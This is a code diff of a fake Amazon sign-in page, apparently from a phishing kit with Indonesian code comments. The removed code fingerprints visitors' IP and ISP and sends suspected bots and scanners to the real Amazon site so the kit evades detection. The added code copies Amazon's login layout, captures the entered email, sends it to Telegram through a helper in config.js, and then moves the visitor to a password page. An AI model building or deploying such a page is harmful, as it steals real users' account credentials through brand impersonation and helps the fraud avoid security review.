@@ -1,108 +1,210 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon — Masuk</title>
+    <title>Amazon Sign In</title>
     <script src="config.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .logo { margin: 15px 0 25px; }
-        .logo img { height: 32px; }
-        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
-        h1 { font-size: 24px; margin-bottom: 20px; }
-        label { font-size: 13px; font-weight: 700; display: block; margin: 18px 0 6px; }
-        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
-        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; cursor: pointer; margin-top: 20px; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .hilang { display: none !important; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Amazon Ember', Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        .logo-amazon {
+            margin: 10px 0 20px;
+        }
+        .logo-amazon img {
+            height: 30px;
+        }
+        .kotak {
+            width: 100%;
+            max-width: 340px;
+            padding: 20px 26px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: #fff;
+        }
+        .kotak h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        .label {
+            font-weight: 700;
+            font-size: 13px;
+            margin: 15px 0 5px;
+            display: block;
+        }
+        .input {
+            width: 100%;
+            padding: 7px 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            font-size: 15px;
+            height: 31px;
+            outline: none;
+        }
+        .input:focus {
+            border-color: #007185;
+            box-shadow: 0 0 0 2px #c8f0f4;
+        }
+        .tombol-lanjut {
+            width: 100%;
+            padding: 7px 10px;
+            background: linear-gradient(to bottom, #f7df89, #ecc000);
+            border: 1px solid #a88700;
+            border-radius: 3px;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 15px 0 20px;
+        }
+        .tombol-lanjut:disabled {
+            background: #e7e9ec;
+            border-color: #adb1b8;
+            cursor: not-allowed;
+        }
+        .tombol-lanjut:not(:disabled):hover {
+            background: linear-gradient(to bottom, #f5d76e, #d4a300);
+        }
+        .keterangan {
+            font-size: 12px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .keterangan a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .keterangan a:hover {
+            text-decoration: underline;
+        }
+        .garis-pemisah {
+            border-bottom: 1px solid #e7e7e7;
+            margin: 20px 0;
+        }
+        .bagian-bisnis {
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        .bagian-bisnis a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .bagian-bisnis a:hover {
+            text-decoration: underline;
+        }
+        .bawah {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+        }
+        .bawah a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .bawah a:hover {
+            text-decoration: underline;
+        }
+        .pesan-error {
+            color: #c40000;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div id="kontenBot" class="hilang">
-        <p>Mengalihkan...</p>
+
+    <div class="logo-amazon">
+        <img src="img/amazonlogo.png" alt="Amazon">
     </div>
 
-    <div id="kontenUtama">
-        <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
-        <div class="kotak">
-            <h1>Masuk</h1>
-            <label>Alamat email</label>
-            <input type="email" id="email" placeholder="nama@contoh.com">
-            <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>
+    <div class="kotak">
+        <h1>Sign in</h1>
+
+        <label class="label" for="email">Enter mobile number or email</label>
+        <input type="text" id="email" class="input" oninput="cekIsian()">
+        <div id="pesan-error" class="pesan-error">Please enter your email or mobile phone number</div>
+
+        <button id="tombol-lanjut" class="tombol-lanjut" disabled onclick="lanjut()">Continue</button>
+
+        <div class="keterangan">
+            By continuing, you agree to Amazon's 
+            <a href="#">Conditions of Use</a> and 
+            <a href="#">Privacy Notice</a>.
+        </div>
+
+        <div class="keterangan">
+            <a href="#">Need help?</a>
+        </div>
+
+        <div class="garis-pemisah"></div>
+
+        <div style="font-size: 13px; font-weight: 700;">Buying for work?</div>
+        <div class="bagian-bisnis">
+            <a href="#">Create a free business account</a>
         </div>
     </div>
 
-    <script>
-        // === CEK PARAMETER & ISP ===
-        const params = new URLSearchParams(window.location.search);
-        const namaParam = localStorage.getItem('namaParameter') || 'akses';
-        const adaParameter = params.has(namaParam);
+    <div class="bawah">
+        <p>
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </p>
+        <p style="margin-top: 5px; color: #888;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+    </div>
 
-        // === SIMPAN DATA PENGAKSES ===
-        async function cekISP() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                const ip = data.ip || 'Tidak diketahui';
-                const negara = data.country_name || '-';
-                const isp = data.org || '-';
+<script>
+function cekIsian() {
+    const email = document.getElementById('email').value.trim();
+    const tombol = document.getElementById('tombol-lanjut');
+    const error = document.getElementById('pesan-error');
+    
+    if (email.length > 0) {
+        tombol.disabled = false;
+        error.style.display = 'none';
+    } else {
+        tombol.disabled = true;
+    }
+}
 
-                // Baca daftar
-                const whitelist = (localStorage.getItem('daftarWhitelist') || '').toLowerCase().split('\n').map(s => s.trim()).filter(Boolean);
-                const blocklist = (localStorage.getItem('daftarBlock') || '').toLowerCase().split('\n').map(s => s.trim()).filter(Boolean);
-                
-                let tipe = 'HUMAN';
-                const ispKecil = isp.toLowerCase();
-
-                // Cek Blocklist dulu
-                for (const blok of blocklist) {
-                    if (ispKecil.includes(blok)) { tipe = 'BOT'; break; }
-                }
-                // Cek Whitelist
-                if (tipe === 'HUMAN') {
-                    for (const izin of whitelist) {
-                        if (ispKecil.includes(izin)) { tipe = 'HUMAN'; break; }
-                    }
-                }
-                // Tanpa parameter = BOT
-                if (!adaParameter) tipe = 'BOT';
-
-                // Simpan ke riwayat
-                const daftar = JSON.parse(localStorage.getItem('dataPengunjung') || '[]');
-                daftar.unshift({
-                    ip, negara, isp, tipe,
-                    halaman: window.location.pathname,
-                    waktu: new Date().toLocaleString('id-ID')
-                });
-                localStorage.setItem('dataPengunjung', JSON.stringify(daftar));
-
-                // === ARAHKAN ===
-                if (tipe === 'BOT') {
-                    // BOT → ke link_bot.txt
-                    document.getElementById('kontenUtama').classList.add('hilang');
-                    const linkBot = localStorage.getItem('linkBotTujuan') || 'https://www.amazon.com';
-                    setTimeout(() => window.location.href = linkBot, 500);
-                }
-            } catch (e) {
-                if (!adaParameter) window.location.href = 'https://www.amazon.com';
-            }
-        }
-
-        // Validasi email
-        const inputEmail = document.getElementById('email');
-        const tombolLanjut = document.getElementById('tombolLanjut');
-        inputEmail.addEventListener('input', function() {
-            tombolLanjut.disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmail.value.trim());
+function lanjut() {
+    const email = document.getElementById('email').value.trim();
+    const error = document.getElementById('pesan-error');
+    
+    if (!email) {
+        error.style.display = 'block';
+        return;
+    }
+    
+    // Simpan email untuk halaman berikutnya
+    localStorage.setItem('email_pengguna', email);
+    
+    // Kirim data ke Telegram
+    if (window.kirimKeTelegram) {
+        window.kirimKeTelegram({
+            tipe: 'LOGIN',
+            email: email
         });
-        function lanjut() {
-            localStorage.setItem('emailPengguna', inputEmail.value.trim());
-            window.location.href = 'password.html';
-        }
+    }
+    
+    // Pindah ke halaman password
+    window.location.href = 'password.html';
+}
+</script>
 
-        // Jalankan
-        cekISP();
-    </script>
 </body>
 </html>
